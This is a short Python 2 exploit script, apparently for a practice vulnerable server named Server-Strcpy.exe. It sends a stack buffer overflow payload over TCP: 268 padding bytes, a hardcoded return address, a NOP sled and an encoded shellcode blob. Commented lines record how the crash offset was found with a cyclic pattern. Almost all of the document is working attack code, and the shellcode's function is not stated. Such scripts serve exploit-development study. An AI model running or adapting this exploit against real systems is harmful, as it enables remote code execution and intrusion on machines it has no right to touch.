
#!/usr/bin/env python
# Server-Strcpy.exe exploit by superkojiman
# http://blog.techorganic.com

import socket, sys


shellcode = (
"\xdb\xc4\xd9\x74\x24\xf4\xbb\x24\xa5\x7b\x0c\x58\x29\xc9\xb1" +
"\x53\x31\x58\x17\x03\x58\x17\x83\xe4\xa1\x99\xf9\x18\x41\xdf" +
"\x02\xe0\x92\x80\x8b\x05\xa3\x80\xe8\x4e\x94\x30\x7a\x02\x19" +
"\xba\x2e\xb6\xaa\xce\xe6\xb9\x1b\x64\xd1\xf4\x9c\xd5\x21\x97" +
"\x1e\x24\x76\x77\x1e\xe7\x8b\x76\x67\x1a\x61\x2a\x30\x50\xd4" +
"\xda\x35\x2c\xe5\x51\x05\xa0\x6d\x86\xde\xc3\x5c\x19\x54\x9a" +
"\x7e\x98\xb9\x96\x36\x82\xde\x93\x81\x39\x14\x6f\x10\xeb\x64" +
"\x90\xbf\xd2\x48\x63\xc1\x13\x6e\x9c\xb4\x6d\x8c\x21\xcf\xaa" +
"\xee\xfd\x5a\x28\x48\x75\xfc\x94\x68\x5a\x9b\x5f\x66\x17\xef" +
"\x07\x6b\xa6\x3c\x3c\x97\x23\xc3\x92\x11\x77\xe0\x36\x79\x23" +
"\x89\x6f\x27\x82\xb6\x6f\x88\x7b\x13\xe4\x25\x6f\x2e\xa7\x21" +
"\x5c\x03\x57\xb2\xca\x14\x24\x80\x55\x8f\xa2\xa8\x1e\x09\x35" +
"\xce\x34\xed\xa9\x31\xb7\x0e\xe0\xf5\xe3\x5e\x9a\xdc\x8b\x34" +
"\x5a\xe0\x59\xa0\x52\x47\x32\xd7\x9f\x37\xe2\x57\x0f\xd0\xe8" +
"\x57\x70\xc0\x12\xb2\x19\x69\xef\x3d\x34\x36\x66\xdb\x5c\xd6" +
"\x2e\x73\xc8\x14\x15\x4c\x6f\x66\x7f\xe4\x07\x2f\x69\x33\x28" +
"\xb0\xbf\x13\xbe\x3b\xac\xa7\xdf\x3b\xf9\x8f\x88\xac\x77\x5e" +
"\xfb\x4d\x87\x4b\x6b\xed\x1a\x10\x6b\x78\x07\x8f\x3c\x2d\xf9" +
"\xc6\xa8\xc3\xa0\x70\xce\x19\x34\xba\x4a\xc6\x85\x45\x53\x8b" +
"\xb2\x61\x43\x55\x3a\x2e\x37\x09\x6d\xf8\xe1\xef\xc7\x4a\x5b" +
"\xa6\xb4\x04\x0b\x3f\xf7\x96\x4d\x40\xd2\x60\xb1\xf1\x8b\x34" +
"\xce\x3e\x5c\xb1\xb7\x22\xfc\x3e\x62\xe7\x0c\x75\x2e\x4e\x85" +
"\xd0\xbb\xd2\xc8\xe2\x16\x10\xf5\x60\x92\xe9\x02\x78\xd7\xec" +
"\x4f\x3e\x04\x9d\xc0\xab\x2a\x32\xe0\xf9")

def main(target, port):
	#buffer = "\x41" * 900
#0x7E47BCAF
	buffer = "\x41" * 268 + "\xAF\xBC\x47\x7E" + "\x90" * 20 + shellcode
#+ shellcode
#	buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9"
#[*] Exact match at offset 268

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target, int(port)))
	print "[+] sending payload of length", len(buffer)
	s.send(buffer)
	s.close()
	print "[+] done"

if __name__ == "__main__":
	main(sys.argv[1], sys.argv[2])
